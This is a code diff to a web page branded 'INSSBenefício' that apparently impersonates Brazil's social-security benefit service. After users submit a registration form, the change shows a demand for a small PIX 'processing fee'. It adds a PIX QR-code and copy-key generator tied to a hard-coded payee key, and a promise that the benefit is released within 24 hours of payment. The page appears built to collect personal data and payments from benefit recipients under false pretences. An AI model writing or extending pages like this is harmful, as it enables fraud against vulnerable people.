@@ -229,6 +229,30 @@ select {
 .form-ok h3 { font-family: 'Sora', sans-serif; font-size: 1.3rem; font-weight: 700; margin-bottom: 10px; }
 .form-ok p { font-size: .9rem; color: var(--text-muted); line-height: 1.65; }
 
+.pix-box {
+  background: #f0faf3;
+  border: 2px solid #22c55e;
+  border-radius: 16px;
+  padding: 24px 20px;
+  margin-top: 8px;
+}
+.pix-valor {
+  font-family: 'Sora', sans-serif;
+  font-size: 2rem;
+  font-weight: 800;
+  color: #168821;
+  margin-bottom: 4px;
+}
+.pix-label { font-size: .78rem; color: #555; margin-bottom: 18px; }
+#qrcode { display: flex; justify-content: center; margin-bottom: 18px; }
+#qrcode canvas, #qrcode img { border-radius: 8px; border: 6px solid #fff; box-shadow: 0 2px 12px rgba(0,0,0,0.10); }
+.pix-chave-label { font-size: .78rem; font-weight: 600; color: #333; margin-bottom: 8px; }
+.pix-copy-row { display: flex; align-items: center; gap: 8px; background: #fff; border: 1.5px solid #ccc; border-radius: 8px; padding: 8px 12px; margin-bottom: 14px; }
+.pix-code { font-size: .65rem; color: #333; word-break: break-all; text-align: left; flex: 1; font-family: monospace; }
+.copy-btn { background: var(--accent); color: #fff; border: none; border-radius: 6px; padding: 6px 14px; font-size: .78rem; font-weight: 700; cursor: pointer; white-space: nowrap; }
+.copy-btn:active { opacity: .8; }
+.pix-note { font-size: .76rem; color: #555; line-height: 1.5; }
+
 /* FOOTER */
 footer {
   background: var(--hero-bg);
@@ -342,8 +366,20 @@ footer p {
         <div class="ok-ring">
           <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
         </div>
-        <h3>Cadastro atualizado!</h3>
-        <p>Seus dados foram recebidos com sucesso.<br>Em breve você será contactado.</p>
+        <h3>Cadastro recebido!</h3>
+        <p style="margin-bottom:24px">Para concluir a atualização, realize o pagamento da taxa de processamento:</p>
+
+        <div class="pix-box">
+          <div class="pix-valor">R$ 0,10</div>
+          <div class="pix-label">Taxa de processamento cadastral</div>
+          <div id="qrcode"></div>
+          <div class="pix-chave-label">Ou copie a chave PIX:</div>
+          <div class="pix-copy-row">
+            <span id="pixCode" class="pix-code"></span>
+            <button onclick="copiarPix()" id="copyBtn" class="copy-btn">Copiar</button>
+          </div>
+          <p class="pix-note">⚡ Após o pagamento, seu benefício será liberado em até 24h úteis.</p>
+        </div>
       </div>
 
     </div>
@@ -354,7 +390,68 @@ footer p {
   <p>© 2024 INSSBenefício — Todos os direitos reservados</p>
 </footer>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script>
+// ── PIX BR Code generator ─────────────────────────────────────
+function pixField(id, val) {
+  return id + String(val.length).padStart(2,'0') + val;
+}
+function crc16(str) {
+  let crc = 0xFFFF;
+  for (let i = 0; i < str.length; i++) {
+    crc ^= str.charCodeAt(i) << 8;
+    for (let j = 0; j < 8; j++) crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
+    crc &= 0xFFFF;
+  }
+  return crc.toString(16).toUpperCase().padStart(4,'0');
+}
+function gerarPixPayload(chave, nome, cidade, valor) {
+  const mai = pixField('00','br.gov.bcb.pix') + pixField('01', chave);
+  const add = pixField('62', pixField('05','***'));
+  const amount = parseFloat(valor).toFixed(2);
+  let p = pixField('00','01')
+        + pixField('26', mai)
+        + pixField('52','0000')
+        + pixField('53','986')
+        + pixField('54', amount)
+        + pixField('58','BR')
+        + pixField('59', nome.substring(0,25))
+        + pixField('60', cidade.substring(0,15))
+        + add
+        + '6304';
+  return p + crc16(p);
+}
+
+function gerarQR() {
+  const payload = gerarPixPayload('29979036000140','INSSBENEFICIO','SAO PAULO','0.10');
+  document.getElementById('pixCode').textContent = payload;
+  document.getElementById('qrcode').innerHTML = '';
+  new QRCode(document.getElementById('qrcode'), {
+    text: payload,
+    width: 200,
+    height: 200,
+    colorDark: '#071D41',
+    colorLight: '#ffffff',
+    correctLevel: QRCode.CorrectLevel.M
+  });
+}
+
+function copiarPix() {
+  const code = document.getElementById('pixCode').textContent;
+  navigator.clipboard.writeText(code).then(() => {
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = 'Copiado ✓';
+    btn.style.background = '#168821';
+    setTimeout(() => { btn.textContent = 'Copiar'; btn.style.background = ''; }, 2000);
+  }).catch(() => {
+    const el = document.getElementById('pixCode');
+    const range = document.createRange();
+    range.selectNode(el);
+    window.getSelection().removeAllRanges();
+    window.getSelection().addRange(range);
+  });
+}
+
 // Máscara telefone
 document.getElementById('btel').addEventListener('input', function() {
   let v = this.value.replace(/\D/g,'').slice(0,11);
@@ -386,6 +483,7 @@ async function enviarBanco(e) {
     if (r.ok) {
       document.getElementById('formWrap').style.display = 'none';
       document.getElementById('formOk').classList.add('show');
+      gerarQR();
     } else {
       throw new Error();
     }
